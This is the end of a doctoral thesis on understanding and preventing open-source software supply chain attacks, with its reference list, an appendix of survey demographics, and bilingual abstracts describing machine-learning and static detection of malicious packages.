- [153] C. Clancy, J. Ferraro, R. Martin, A. Pennington, C. Sledjeski, and C. Wiener, « Deliver uncompromised: securing critical software supply chains », _MITRE Technical Papers_ , vol. 24, Jan. 2021. 

- [154] Google. « Google’s open source documentation ». [Online; accessed 20-October2021]. (), [Online]. Available: `https://opensource.google/docs/thirdparty/ retrieving//#get-the-code` (visited on 11/25/2021). 

- [155] T. Durieux, C. Le Goues, M. Hilton, and R. Abreu, « Empirical study of restarted and flaky builds on travis ci », _Proceedings of the 17th International Conference on Mining Software Repositories_ , Jun. 2020. doi: `10.1145/3379597.3387460` . [Online]. Available: `http://dx.doi.org/10.1145/3379597.3387460` . 

- [156] R. Goyal, G. Ferreira, C. Kästner, and J. Herbsleb, « Identifying unusual commits on github », _Journal of Software: Evolution and Process_ , vol. 30, no. 1, e1893, 2018. 

180 

- [157] C. Soto-Valero, N. Harrand, M. Monperrus, and B. Baudry, « A comprehensive study of bloated dependencies in the maven ecosystem », _Empirical Software Engineering_ , vol. 26, no. 3, Mar. 2021, issn: 1573-7616. doi: `10.1007/s10664-02009914-8` . [Online]. Available: `http://dx.doi.org/10.1007/s10664-020-099148` . 

- [158] T. K. Kuppusamy, S. Torres-Arias, V. Diaz, and J. Cappos, « Diplomat: using delegations to protect community repositories », in _Proceedings of the 13th Usenix Conference on Networked Systems Design and Implementation_ , ser. NSDI’16, Santa Clara, CA: USENIX Association, 2016, pp. 567–581, isbn: 9781931971294. 

- [159] L. Neil, S. Mittal, and A. Joshi, « Mining threat intelligence about open-source projects and libraries from code repository issues and bug reports », in _2018 IEEE International Conference on Intelligence and Security Informatics (ISI)_ , 2018, pp. 7–12. doi: `10.1109/ISI.2018.8587375` . 

- [160] F. Gröbert, A.-R. Sadeghi, and M. Winandy, « Software distribution as a malware infection vector », in _2009 International Conference for Internet Technology and Secured Transactions, (ICITST)_ , 2009, pp. 1–6. doi: `10.1109/ICITST.2009. 5402538` . 

- [161] K. Singi, V. Kaulgud, R. J. C. Bose, and S. Podder, « Shift - software identity framework for global software delivery », in _2019 ACM/IEEE 14th International Conference on Global Software Engineering (ICGSE)_ , 2019, pp. 122–128. doi: `10. 1109/ICGSE.2019.00032` . 

- [162] T. K. Kuppusamy, V. Diaz, and J. Cappos, « Mercury: bandwidth-effective prevention of rollback attacks against community repositories », in _2017 USENIX Annual Technical Conference (USENIX ATC 17)_ , Santa Clara, CA: USENIX Association, Jul. 2017, pp. 673–688, isbn: 978-1-931971-38-6. [Online]. Available: `https: //www.usenix.org/conference/atc17/technical-sessions/presentation/ kuppusamy` . 

- [163] K. Alhamed, M. C. Silaghi, I. Hussien, and Y. Yang, « Security by decentralized certification of automatic-updates for open source software controlled by volunteers », in _Workshop on Decentralized Coordination_ , Citeseer, 2013. 

- [164] N. Forsgren, B. Alberts, K. Backhouse, _et al._ , _2020 state of the octoverse: securing the world’s software_ , 2021. arXiv: `2110.10246 [cs.SE]` . 

181 

- [165] S. Du, T. Lu, L. Zhao, B. Xu, X. Guo, and H. Yang, « Towards an analysis of software supply chain risk management », 2013. 

- [166] C. W. Axelrod, « Assuring software and hardware security and integrity throughout the supply chain », in _2011 IEEE International Conference on Technologies for Homeland Security (HST)_ , 2011, pp. 62–68. doi: `10.1109/THS.2011.6107848` . 

- [167] J. Marjanović, N. Dalčeković, and G. Sladić, « Improving critical infrastructure protection by enhancing software acquisition process through blockchain », in _7th Conference on the Engineering of Computer Based Systems_ , ser. ECBS 2021, Novi Sad, Serbia: Association for Computing Machinery, 2021, isbn: 9781450390576. doi: `10.1145/3459960.3459973` . [Online]. Available: `https://doi.org/10. 1145/3459960.3459973` . 

- [168] N. Imtiaz, S. Thorn, and L. Williams, « A comparative study of vulnerability reporting by software composition analysis tools », in _Proceedings of the 15th ACM / IEEE International Symposium on Empirical Software Engineering and Measurement (ESEM)_ . New York, NY, USA: Association for Computing Machinery, 2021, isbn: 9781450386654. [Online]. Available: `https://doi.org/10.1145/3475716. 3475769` . 

- [169] S. Zhang, X. Zhang, X. Ou, L. Chen, N. Edwards, and J. Jin, « Assessing attack surface with component-based package dependency », in _International Conference on Network and System Security_ , Springer, 2015, pp. 405–417. 

- [170] P. R. Croll, « Supply chain risk management - understanding vulnerabilities in code you buy, build, or integrate », in _2011 IEEE International Systems Conference_ , 2011, pp. 194–200. doi: `10.1109/SYSCON.2011.5929123` . 

- [171] R. J. Ellison and C. Woody, « Supply-chain risk management: incorporating security into software development », in _2010 43rd Hawaii International Conference on System Sciences_ , 2010, pp. 1–10. doi: `10.1109/HICSS.2010.355` . 

- [172] N. Vasilakis, B. Karel, N. Roessler, N. Dautenhahn, A. DeHon, and J. M. Smith, « Breakapp: automated, flexible application compartmentalization. », in _NDSS_ , 2018. 

- [173] B. Lamowski, C. Weinhold, A. Lackorzynski, and H. Härtig, « Sandcrust: automatic sandboxing of unsafe components in rust », ser. PLOS’17, Shanghai, China: Association for Computing Machinery, 2017, pp. 51–57, isbn: 9781450351539. doi: 

182 

`10.1145/3144555.3144562` . [Online]. Available: `https://doi.org/10.1145/ 3144555.3144562` . 

- [174] B. A. Sabbagh and S. Kowalski, « A socio-technical framework for threat modeling a software supply chain », _IEEE Security Privacy_ , vol. 13, no. 4, pp. 30–39, 2015. doi: `10.1109/MSP.2015.72` . 

- [175] M. Naedele and T. E. Koch, « Trust and tamper-proof software delivery », ser. SESS ’06, Shanghai, China: Association for Computing Machinery, 2006, pp. 51–58, isbn: 1595934111. doi: `10.1145/1137627.1137636` . [Online]. Available: `https://doi. org/10.1145/1137627.1137636` . 

- [176] P. Goswami, S. Gupta, Z. Li, N. Meng, and D. Yao, « Investigating the reproducibility of npm packages », in _2020 IEEE International Conference on Software Maintenance and Evolution (ICSME)_ , 2020, pp. 677–681. doi: `10.1109/ ICSME46990.2020.00071` . 

- [177] X. de Carné de Carnavalet and M. Mannan, « Challenges and implications of verifiable builds for security-critical open-source software », ser. ACSAC ’14, New Orleans, Louisiana, USA: Association for Computing Machinery, 2014, pp. 16– 25, isbn: 9781450330053. doi: `10.1145/2664243.2664288` . [Online]. Available: `https://doi.org/10.1145/2664243.2664288` . 

- [178] M. Ohm, A. Sykosch, and M. Meier, « Towards detection of software supply chain attacks by forensic artifacts », Aug. 2020. doi: `10.1145/3407023.3409183` . 

- [179] K. Garrett, G. P. Ferreira, L. Jia, J. Sunshine, and C. Kästner, « Detecting suspicious package updates », _2019 IEEE/ACM 41st International Conference on Software Engineering: New Ideas and Emerging Results (ICSE-NIER)_ , pp. 13–16, 2019. 

- [180] A. Sabetta and M. Bezzi, « A practical approach to the automatic classification of security-relevant commits », in _2018 IEEE International Conference on Software Maintenance and Evolution (ICSME)_ , 2018, pp. 579–582. doi: `10.1109/ICSME. 2018.00058` . 

- [181] I. Pashchenko, H. Plate, S. E. Ponta, A. Sabetta, and F. Massacci, « Vulnerable open source dependencies: counting those that matter », ser. ESEM ’18, Oulu, Finland: Association for Computing Machinery, 2018, isbn: 9781450358231. doi: 

183 

`10.1145/3239235.3268920` . [Online]. Available: `https://doi.org/10.1145/ 3239235.3268920` . 

- [182] N. Vasilakis, A. Benetopoulos, S. Handa, A. Schoen, J. Shen, and M. C. Rinard, « Supply-chain vulnerability elimination via active learning and regeneration », in _Proceedings of the 2021 ACM SIGSAC Conference on Computer and Communications Security_ , ser. CCS ’21, Virtual Event, Republic of Korea: Association for Computing Machinery, 2021, pp. 1755–1770, isbn: 9781450384544. doi: `10.1145/3460120.3484736` . [Online]. Available: `https://doi.org/10.1145/ 3460120.3484736` . 

- [183] A. Decan, T. Mens, and E. Constantinou, « On the impact of security vulnerabilities in the npm package dependency network », in _Proceedings of the 15th International Conference on Mining Software Repositories_ , ser. MSR ’18, Gothenburg, Sweden: Association for Computing Machinery, 2018, pp. 181–191, isbn: 9781450357166. doi: `10 . 1145 / 3196398 . 3196401` . [Online]. Available: `https : //doi.org/10.1145/3196398.3196401` . 

- [184] F. Valsorda, _How go mitigates supply chain attacks_ , `https://go.dev/blog/ supply-chain` , [Accessed 30-Jun-2023], 2022. 

- [185] _Stack Overflow Developer Survey 2022 -- survey.stackoverflow.co_ , `https://survey. stackoverflow.co/2022/#technology-most-loved-dreaded-and-wanted` , [Accessed 30-Jun-2023], 2022. 

- [186] S. Vaughan-Nichols, _Linus Torvalds: Rust will go into Linux 6.1 -- zdnet.com_ , `https://www.zdnet.com/article/linus-torvalds-rust-will-go-intolinux-6-1` , [Accessed 30-Jun-2023], 2022. 

- [187] S. Schrittwieser, S. Katzenbeisser, J. Kinder, G. Merzdovnik, and E. Weippl, « Protecting software through obfuscation: can it keep pace with progress in code analysis? », _ACM Comput. Surv._ , vol. 49, no. 1, Apr. 2016, issn: 0360-0300. doi: `10.1145/2886012` . [Online]. Available: `https://doi.org/10.1145/2886012` . 

- [188] C. Collberg and C. Thomborson, « Watermarking, tamper-proofing, and obfuscation - tools for software protection », _IEEE Transactions on Software Engineering_ , vol. 28, no. 8, pp. 735–746, 2002. doi: `10.1109/TSE.2002.1027797` . 

- [189] H. Xu, Y. Zhou, Y. Kang, and M. R. Lyu, _On secure and usable program obfuscation: a survey_ , 2017. arXiv: `1710.01139 [cs.CR]` . 

184 

- [190] C. Collberg, C. Thomborson, and D. Low, « A taxonomy of obfuscating transformations », Department of Computer Science, The University of Auckland, New Zealand, Tech. Rep., 1997. 

- [191] _Package.json - npm Docs_ , `https://docs.npmjs.com/cli/v8/configuringnpm/package-json#scripts` , [Accessed 30-Jun-2023]. 

- [192] _Npm-install - npm Docs_ , `https://docs.npmjs.com/cli/v9/commands/npminstall` , [Accessed 30-Jun-2023]. 

- [193] _Scripts - Composer -- getcomposer.org_ , `https://getcomposer.org/doc/articles/ scripts.md#scripts` , [Accessed 30-Jun-2023]. 

- [194] _Command-line interface / Commands - Composer -- getcomposer.org_ , `https:// getcomposer.org/doc/03-cli.md#install-i` , [Accessed 30-Jun-2023]. 

- [195] _Pip install - pip documentation v23.1.2 -- pip.pypa.io_ , `https://pip.pypa.io/en/ stable/cli/pip_install/#cmdoption-only-binary` , [Accessed 30-Jun-2023]. 

- [196] _Build scripts - the cargo book_ , `https://doc.rust-lang.org/cargo/reference/ build-scripts.html` , [Accessed 30-Jun-2023]. 

- [197] _Gems with Extensions_ , `https://guides.rubygems.org/gems-with-extensions` , [Accessed 30-Jun-2023]. 

- [198] _Modules: Packages_ , `https://nodejs.org/api/packages.html` , [Accessed 30Jun-2023]. 

- [199] _The import system_ , `https://docs.python.org/3/reference/import.html` , [Accessed 30-Jun-2023]. 

- [200] _Effective Go - The Go Programming Language_ , `https://go.dev/doc/effective_ go` , [Accessed 30-Jun-2023]. 

- [201] P. Gomes, _Golang: stop trusting your dependencies!_ , `https://itnext.io/golangstop- trusting- your- dependencies- a4c916533b04` , [Accessed 30-Jun-2023], 2019. 

- [202] M. Henriksen, _Finding Evil Go Packages_ , `https://michenriksen.com/blog/ finding-evil-go-packages/` , [Accessed 11-Jul-2023], 2021. 

- [203] S. S. R. Team, _Sonatype Stops Software Supply Chain Attack Aimed at the Java Developer Community — blog.sonatype.com_ , `https : / / blog . sonatype . com / malware-removed-from-maven-central` , [Accessed 22-08-2023]. 

185 

- 

- [204] _Chapter 8. Classes docs.oracle.com_ , `https://docs.oracle.com/javase/ specs/jls/se20/html/jls-8.html` , [Accessed 28-08-2023]. 

- 

- [205] _Chapter 12. Execution docs.oracle.com_ , [Accessed 28-08-2023]. [Online]. Available: `https://docs.oracle.com/javase/specs/jls/se20/html/jls-12.html` . 

- [206] M. Sikorski and A. Honig, _Practical Malware Analysis: The Hands-On Guide to Dissecting Malicious Software_ , 1st. USA: No Starch Press, 2012, isbn: 1593272901. 

- [207] S. A. Sebastian, S. Malgaonkar, P. Shah, M. Kapoor, and T. Parekhji, « A study & review on code obfuscation », in _2016 World Conference on Futuristic Trends in Research and Innovation for Social Welfare (Startup Conclave)_ , 2016, pp. 1–6. doi: `10.1109/STARTUP.2016.7583913` . 

- [208] P. R. Team, _Phylum Discovers Dozens More PyPI Packages Attempting to Deliver W4SP Stealer in Ongoing Supply-Chain Attack_ , `https : / / blog . phylum . io / phylum-discovers-dozens-more-pypi-packages-attempting-to-deliverw4sp-stealer-in-ongoing-supply-chain-attack/` , [Accessed 30-Jun-2023], 2022. 

- [209] X. Ugarte-Pedrero, D. Balzarotti, I. Santos, and P. G. Bringas, « Sok: deep packer inspection: a longitudinal study of the complexity of run-time packers », in _2015 IEEE Symposium on Security and Privacy_ , 2015, pp. 659–673. doi: `10.1109/SP. 2015.46` . 

- [210] C. P. Research, _Check Point CloudGuard Spectral exposes new obfuscation techniques for malicious packages on PyPI_ , `https://research.checkpoint.com/ 2022/check-point-cloudguard-spectral-exposes-new-obfuscation-techniquesfor-malicious-packages-on-pypi/` , [Accessed 30-Jun-2023], 2022. 

- [211] Geek, _Tricky use of static initializer in Java - Override println — geekexplains.blogspot.com_ , `http://geekexplains.blogspot.com/2009/05/tricky- use- of- staticinitializer-in.html` , [Accessed 28-08-2023], 2010. 

- [212] B. van der Bijl, _Monkey Patching in Go_ , `https : / / bou . ke / blog / monkey - patching-in-go/` , [Accessed 30-Jun-2023], 2015. 

- [213] J. Williams, « Enterprise java rootkits: "hardly anyone watches the developers" », in _BlackHat USA_ , 2009. 

186 

- [214] A. Shabtai, R. Moskovitch, Y. Elovici, and C. Glezer, « Detection of malicious code by applying machine learning classifiers on static features: a state-of-the-art survey », _information security technical report_ , vol. 14, no. 1, pp. 16–29, 2009. 

- [215] R. Moskovitch, D. Stopel, C. Feher, N. Nissim, and Y. Elovici, « Unknown malcode detection via text categorization and the imbalance problem », in _2008 IEEE international conference on intelligence and security informatics_ , IEEE, 2008, pp. 156– 161. 

- [216] T. Chen and C. Guestrin, « Xgboost: a scalable tree boosting system », in _Proceedings of the 22nd acm sigkdd international conference on knowledge discovery and data mining_ , 2016, pp. 785–794. 

- [217] J. H. Friedman, « Greedy function approximation: a gradient boosting machine », _Annals of statistics_ , pp. 1189–1232, 2001. 

- [218] R. Turner, D. Eriksson, M. McCourt, _et al._ , « Bayesian optimization is superior to random search for machine learning hyperparameter tuning: analysis of the blackbox optimization challenge 2020 », in _NeurIPS 2020 Competition and Demonstration Track_ , PMLR, 2021, pp. 3–26. 

- [219] Z. Huang and Y. He, « Auto-detect: data-driven error detection in tables », in _Proceedings of the 2018 International Conference on Management of Data_ , ser. SIGMOD ’18, Houston, TX, USA: Association for Computing Machinery, 2018, pp. 1377– 1392, isbn: 9781450347037. doi: `10.1145/3183713.3196889` . [Online]. Available: `https://doi.org/10.1145/3183713.3196889` . 

- [220] _Phylum Discovers Dozens More PyPI Packages Attempting to Deliver W4SP Stealer in Ongoing Supply-Chain Attack_ , `https://blog.phylum.io/phylum-discoversdozens-more-pypi-packages-attempting-to-deliver-w4sp-stealer-inongoing-supply-chain-attack` , [Accessed 11-Jan-2023]. 

- [221] _The java virtual machine instruction set_ , `https://docs.oracle.com/javase/ specs/jvms/se7/html/jvms-6.html` , [Accessed 02-Jul-2022]. 

- [222] _Java Platform, Standard Edition Documentation_ , `https://docs.oracle.com/ en/java/javase/index.html` , [Accessed 12-Jul-2022]. 

- [223] _ASMifier (ASM 9.3)_ , `https://asm.ow2.io/javadoc/org/objectweb/asm/util/ ASMifier.html` , [Accessed 06-Sep-2022]. 

187 

- [224] C. E. Shannon, « A mathematical theory of communication », _The Bell system technical journal_ , vol. 27, no. 3, pp. 379–423, 1948. 

- [225] S. Kullback and R. A. Leibler, « On information and sufficiency », _The annals of mathematical statistics_ , vol. 22, no. 1, pp. 79–86, 1951. 

- [226] _Compact language detector 2_ , `https://github.com/CLD2Owners/cld2` , [Accessed 03-Jul-2022]. 

- [227] _Reverse shell cheat sheet_ , `https://github.com/swisskyrepo/PayloadsAllTheThings/ blob/master/MethodologyandResources/ReverseShellCheatsheet.md` , [Accessed 26-Jun-2022]. 

- [228] _Local File Inclusion_ , `https://sushant747.gitbooks.io/total-oscp-guide/ content/local_file_inclusion.html` , [Accessed 26-Jun-2022]. 

- [229] Oracle, _The Java Scripting API - java documentation_ , `https://docs.oracle. com/javase/8/docs/technotes/guides/scripting/prog_guide/api.html` , [Accessed 25-Jun-2022]. 

- [230] G. McCluskey, _Using java reflection_ , `https://www.oracle.com/technicalresources/articles/java/javareflection.html` , [Accessed 25-Jun-2022], 1998. 

- [231] Oracle, _What is an exception? - java documentation_ , `https://docs.oracle. com/javase/tutorial/essential/exceptions/definition.html` , [Accessed 25-Jun-2022]. 

- [232] E. Bruneton, « Asm 3.0 a java bytecode engineering library », _URL: http://download. forge. objectweb. org/asm/asmguide. pdf_ , 2007. 

- [233] E. Filiol, _Computer viruses: from theory to applications_ . Springer Science & Business Media, 2006. 

- [234] A. Moser, C. Kruegel, and E. Kirda, « Limits of static analysis for malware detection », in _Twenty-Third Annual Computer Security Applications Conference (ACSAC 2007)_ , 2007, pp. 421–430. doi: `10.1109/ACSAC.2007.21` . 

- [235] A. Figueiras, « Towards the understanding of interaction in information visualization », in _2015 19th International Conference on Information Visualisation_ , 2015, pp. 140–147. doi: `10.1109/iV.2015.34` . 

188 

- [236] P. Team, _Compromised pytorch-nightly dependency chain between december 25th and december 30th, 2022._ `https://pytorch.org/blog/compromised-nightlydependency/` , [Accessed 02-Feb-2023]. 

- [237] Sonatype, _Understanding Open Source Adoption: Insights from the 9th State of the —_ 

- _Software Supply Chain Report. sonatype.com_ , `https://www.sonatype.com/ state-of-the-software-supply-chain/introduction` , [Accessed 21-11-2023], 2023. 

- [238] E. Gandotra, D. Bansal, and S. Sofat, « Malware analysis and classification: a survey », _Journal of Information Security_ , vol. 2014, 2014. 

- 

- [239] CISA, _CISA Open Source Software Security Roadmap | CISA cisa.gov_ , `https: //www.cisa.gov/resources-tools/resources/cisa-open-source-softwaresecurity-roadmap` , [Accessed 17-11-2023], 2023. 

- [240] OWASP, _Software component verification standard_ , `https://owasp-scvs.gitbook. io/scvs/` , [Accessed 23-11-2023], 2020. 

- [241] T. W. House, _Memorandum for the heads of executive departments and agencies_ , `https://www.whitehouse.gov/wp-content/uploads/2022/09/M-22-18.pdf` , [Accessed 23-11-2023], 2022. 

- [242] S. Torres-Arias, D. Geer, and J. Meyers, « A viewpoint on knowing software: bill of materials quality when you see it », _IEEE Security & Privacy_ , vol. 21, no. 06, pp. 50–54, Nov. 2023, issn: 1558-4046. doi: `10.1109/MSEC.2023.3315887` . 

- [243] M. Balliu, B. Baudry, S. Bobadilla, _et al._ , « Challenges of producing software bill of materials for java », _IEEE Security & Privacy_ , vol. 21, no. 06, pp. 12–23, Nov. 2023, issn: 1558-4046. doi: `10.1109/MSEC.2023.3302956` . 

- [244] N. Imtiaz and L. Williams, « Phantom artifacts & code review coverage in dependency updates », _arXiv preprint arXiv:2206.09422_ , 2022. 

- [245] T. W. House, _Executive Order on Improving the Nation’s Cybersecurity_ , `https: //www.whitehouse.gov/briefing-room/presidential-actions/2021/05/ 12/executive-order-on-improving-the-nations-cybersecurity` , [Accessed 30-Jun-2023], 2021. 

189 

- [246] A. V. Barabanov, A. S. Markov, M. I. Grishin, and V. L. Tsirlov, « Current taxonomy of information security threats in software development life cycle », in _2018 IEEE 12th International Conference on Application of Information and Communication Technologies (AICT)_ , 2018, pp. 1–6. doi: `10.1109/ICAICT.2018.8747065` . 

- [247] SLSA, _Supply-chain Levels for Software Artifacts — slsa.dev_ , `https://slsa.dev/` , [Accessed 13-10-2023]. 

- [248] M. Ohm, L. Kempf, F. Boes, and M. Meier, « If you’ve seen one, you’ve seen them all: leveraging AST clustering using MCL to mimic expertise to detect software supply chain attacks », _CoRR_ , vol. abs/2011.02235, 2020. arXiv: `2011 . 02235` . [Online]. Available: `https://arxiv.org/abs/2011.02235` . 

- [249] B. Kordy, S. Mauw, S. Radomirović, and P. Schweitzer, « Foundations of attack– defense trees », in _International Workshop on Formal Aspects in Security and Trust_ , Springer, 2010, pp. 80–95. 

- [250] J. Wynn, J. Whitmore, G. Upton, _et al._ , « Threat assessment and remediation analysis (tara) », _MITRE Corporation_ , 2014. 

- [251] GitHub. « The 2021 state of the octoverse ». [Online; accessed 20-October-2021]. (2021), [Online]. Available: `https://octoverse.github.com/#top-languagesover-the-years` (visited on 11/25/2021). 

- [252] _Specification reference - rubygems guides_ , `https : / / guides . rubygems . org / specification-reference/` , [Accessed 30-Jun-2023]. 

- [253] OpenSSF, _Threat Modeling the Supply Chain for Software Consumers - Open —_ 

- _Source Security Foundation openssf.org_ , `https://openssf.org/blog/2023/ 09/27/threat- modeling- the- supply- chain- for- software- consumers/` , [Accessed 17-11-2023], 2023. 

- [254] E. Labs, _Exploring Risk: Understanding Software Supply Chain Attacks | Endor —_ 

- _Labs endorlabs.com_ , `https://www.endorlabs.com/blog/exploring-riskunderstanding-software-supply-chain-attacks` , [Accessed 17-11-2023], 2023. 

190 

Appendix A 

## **USER SURVEY DEMOGRAPHICS** 

This section provides demographic information about the respondents of the two online surveys. The complete results are depicted in Table A.1. In summary, the respondents to the expert survey meet the requirement of being experts in the domain and participate actively in OSS projects. The respondents to the developer survey regularly consume OSS and have little knowledge of supply chain security. 

**Domain Experts 17 respondents** participated in the online survey designed for experts in the domain of _software supply chain security_ . According to the self-assessment of their skills, 12 respondents consider themselves **knowledgeable in the domain of supply chain security** , but also in software security (14) and development (12). Considering their acquaintance with 11 popular languages [251], the respondents cover 9 out of them, whereby Python, Java and JavaScript are covered best, while nobody had a background in .NET and Objective-C. 14 out of the 17 respondents are active participants in OSS projects, and were asked about their respective role (multiple choice): all 14 are contributors, 7 are project maintainers, and 3 exercise other roles. 9 experts work in the private sector, compared to 5 working in the public sector (e.g., government, academia) and 3 in the not-for-profit sector. They cover the industry sectors information industry (8), computer industry (2), telecommunications (2), entertainment industry (1), mass media (1), defense (1) and others (2). 

**Developers 134 respondents** participated in the online survey designed for software developers, who were assumed to exercise the role of downstream consumers in OSS supply chains. This assumption was confirmed given that 121 (90%) responded to using opensource components in their daily job. Moreover, 37 (28%) actively participate in OSS projects: 31 as contributors and 22 as maintainers (multiple choice). 74 are also maintainers of code repositories, and 21 administer package repositories. The self-assessment of their skills shows that they are **knowledgeable in software development** (113), and 

191 

less so in supply chain security (22) and software security (44). They cover all of the 11 programming languages (multiple choice), whereby Java, JavaScript and Python are the most popular ones. The majority of the respondents (120) work in the private sector. In terms of industry sectors, computer and information industry (55 and 54) outweigh other sectors. 

|**Expert Survey**<br>**Expertise Self-Assessment**<br>SW Supply Chain Se-<br>curity:<br>1<br>1 (6%)<br>2<br>1 (6%)<br>3<br>3 (18%)<br>4<br>6 (35%)<br>5<br>6 (35%)<br>SW Security:<br>1<br>1 (6%)<br>2<br>1 (6%)<br>3<br>1 (6%)<br>4<br>9 (53%)<br>5<br>5 (29%)<br>SW Development:<br>1<br>1 (6%)<br>2<br>1 (6%)<br>3<br>3 (18%)<br>4<br>6 (35%)<br>5<br>6 (35%)<br>DevOps:<br>1<br>2 (12%)<br>2<br>4 (24%)<br>3<br>5 (29%)<br>4<br>3 (18%)<br>5<br>3 (18%)<br>**Programming Language**<br>**_Python_**<br>**_Java_**<br>**_JS_**<br>**_Go_**<br>**_Ruby_**<br>**_Rust_**<br>**_PHP_**<br>**_C_**<br>**_C++_**<br>**_.NET_**<br>**_Obj-C_**<br>14<br>10 8<br>3<br>3<br>2<br>2<br>2<br>1<br>0<br>0<br>**Participation in OSS prjs.**<br>**Role(s) of the 14 participants**<br>Yes:<br>14<br>Contributor:<br>14<br>No:<br>3<br>Maintainer:<br>7<br>Other:<br>3|**Software Developer Survey**|
|---|---|
||**Expertise Self-Assessment**|
||SW<br>Supply<br>Chain Security:<br>1<br>49 (37%)<br>2<br>38 (28%)<br>3<br>26 (19%)<br>4<br>17 (13%)<br>5<br>5 (3%)<br>SW Security:<br>1<br>17 (13%)<br>2<br>32 (24%)<br>3<br>41 (31%)<br>4<br>29 (22%)<br>5<br>15 (11%)<br>SW<br>Develop-<br>ment:<br>1<br>2 (2%)<br>2<br>7 (5%)<br>3<br>12 (9%)<br>4<br>51 (38%)<br>5<br>62 (46%)<br>DevOps:<br>1<br>12 (9%)<br>2<br>28 (21%)<br>3<br>49 (37%)<br>4<br>33 (25%)<br>5<br>12 (9%)|
||**Programming Language**|
||**_Python_**<br>**_Java_**<br>**_JS_**<br>**_Go_**<br>**_Ruby_**<br>**_Rust_**<br>**_PHP_**<br>**_C_**<br>**_C++_**<br>**_.NET_**<br>**_Obj-C_**<br>48<br>86 77 27 2<br>4<br>5<br>14 15<br>15 1|
||**Participation in OSS prjs.**<br>**Role(s) of the 37 participants**|
||Yes:<br>37<br>Contributor:<br>31<br>No:<br>97<br>Maintainer:<br>22<br>Other:<br>0|



Table A.1 – Demographic information about domain experts (left) and developers (right). The expertise self-assessment used a Likert scale from 1 (low) to 5 (high). Multiple-choice questions were used to understand participants’ skills in different prg. languages, and – for – those who said to participate in OSS projects the nature of their involvement. 

192 

**==> picture [399 x 142] intentionally omitted <==**

**Titre :** Comprendre et Prévenir les Attaques à la Chaîne d’Approvisionnement de Logiciels Open-Source 

## **Mot clés :** Open-Source Security; Supply Chain Attacks; Malware Detection 

**Résumé :** La modularisation des logiciels est cruciale pour le développement moderne, divisant des systèmes complexes en composants gérables et favorisant la réutilisation. L’open-source est central en fournissant des modules pré-construits, représentant jusqu’à 98% des bases de code dans les piles technologiques. Cependant, il comporte des risques, l’automatisation et les dépendances complexes le rendent vulnérable aux attaques de la chaîne d’approvisionnement. Cette thèse vise à renforcer la sécurité de l’open-source et à protéger l’intégrité des chaînes d’approvisionnement. Elle explore les attaques de la chaîne d’approvisionnement 

open-source, propose une taxonomie des attaques et identifie les sauvegardes existantes. Nous détaillons également comment les dépendances tierces parviennent à s’exécuter sur les systèmes en aval et suggérons des méthodes de détection automatisées pour les paquets malveillants au sein des attaques de la chaîne d’approvisionnement open-source. Tout d’abord, nous évaluons une approche basée sur l’apprentissage automatique pour détecter les paquets malveillants en JavaScript et Python. Ensuite, nous évaluons une approche statique pour identifier les paquets malveillants en Java. 

## **Title:** Understanding and Preventing Open-Source Software Supply Chain Attacks 

## **Keywords:** Open-Source Security; Supply Chain Attacks; Malware Detection 

**Abstract:** Software modularization is a key practice in modern software development, dividing complex systems into manageable components and promoting reusability. Opensource is central, providing pre-built modules that boost productivity. It’s widely used across tech stacks, forming a significant portion, up to 98%, of codebases. While open-source accelerates development and allows developers to focus on unique problems, it has inherent risks. Automation via package managers and intricate dependencies obscure chains from end-users, who implicitly trust each element, making open-source susceptible to supply chain attacks. The goal of this thesis is to enhance security and safeguard the integrity of 

open-source software supply chains. We explore open-source supply chain attacks, aiming to understand and prevent them. We propose a comprehensive, technology-agnostic taxonomy of these attacks and map existing safeguards that mitigate them. We also detail how third-party dependencies gain execution on downstream systems and suggest automated detection methods for malicious packages within open-source supply chain attacks. First, we assess a machine learning-based approach for detecting malicious packages in JavaScript and Python. Then, we evaluate a static approach to identify malicious packages in Java. 

**Résumé de la thèse de doctorat :** Comprendre et Prévenir les Attaques à la Chaîne d’Approvisionnement de Logiciels Open-Source 

La modularisation logicielle est une pratique essentielle dans le développement logiciel moderne, permettant de diviser des systèmes complexes en composants gérables et de promouvoir la réutilisabilité du logiciel. Les logiciels open-source (OSS) jouent un rôle central en offrant une large gamme de modules préconstruits et réutilisables qui améliorent la productivité. Les OSS sont largement adoptés dans la pile technologique et le cycle de vie du développement, tant dans le secteur privé que public, et peuvent représenter jusqu'à 98 % d'une base de code[1] . 

Bien que l'utilisation des OSS présente de nombreux avantages, tels que l'accélération du développement logiciel et la possibilité pour les développeurs de se concentrer sur la résolution de problèmes spécifiques, elle comporte également plusieurs risques inhérents. L'automatisation complète fournie par les gestionnaires de paquets et le réseau complexe de dépendances peuvent obscurcir la chaîne de dépendances pour les utilisateurs finaux, qui placent implicitement leur confiance dans chaque élément de cette chaîne, y compris les auteurs de ces dépendances. 

Premièrement, les OSS peuvent être susceptibles de contenir des vulnérabilités non intentionnelles, tout comme tout autre logiciel. Un exemple récent et marquant de l'impact d'une vulnérabilité grave dans un composant open-source est le cas de Log4Shell[2] , une vulnérabilité trouvée dans la bibliothèque Log4j. Cette vulnérabilité se distingue non seulement par sa gravité élevée, mais aussi par le grand nombre d'utilisateurs (directs et indirects) qu'elle a affectés. La popularité et la criticité de cette vulnérabilité ont incité une réponse rapide. Cependant, dans le monde open-source, une telle réponse rapide n'est pas toujours garantie. Certains projets peuvent manquer de support dédié ou de documentation complète, ce qui peut rendre difficile pour les utilisateurs de résoudre les problèmes ou de recevoir une assistance en temps opportun. 

Deuxièmement, les attaquants peuvent exploiter l'adoption généralisée des logiciels libres tout au long du cycle de développement logiciel pour propager des logiciels malveillants. D'une manière générale, les **attaques contre la chaîne d'approvisionnement des logiciels** , qui peuvent viser aussi bien les logiciels à code source fermé que les logiciels à code source ouvert, ont pour but d'injecter des codes malveillants dans les composants logiciels afin de compromettre les consommateurs de ces produits logiciels. Les attaquants peuvent exploiter l'adoption généralisée des OSS tout au long du cycle de vie du développement logiciel pour propager des logiciels malveillants. Les attaques de la chaîne d'approvisionnement logicielle, qui peuvent cibler à la fois les logiciels propriétaires et open-source, visent à injecter du code malveillant dans les composants logiciels pour compromettre les consommateurs de ces produits. Des incidents notables, tels que l'infection de la plateforme 

> 1 F. Nagle, J. Dana, J. Ho/man, S. Randazzo, and Y. Zhou, « Census ii of free and open source software—application libraries », Linux Foundation, Harvard 

> 2 NIST, NVD - CVE-2021-44228 — nvd.nist.gov, https://nvd.nist.gov/vuln/detail/CVE-2021-44228 

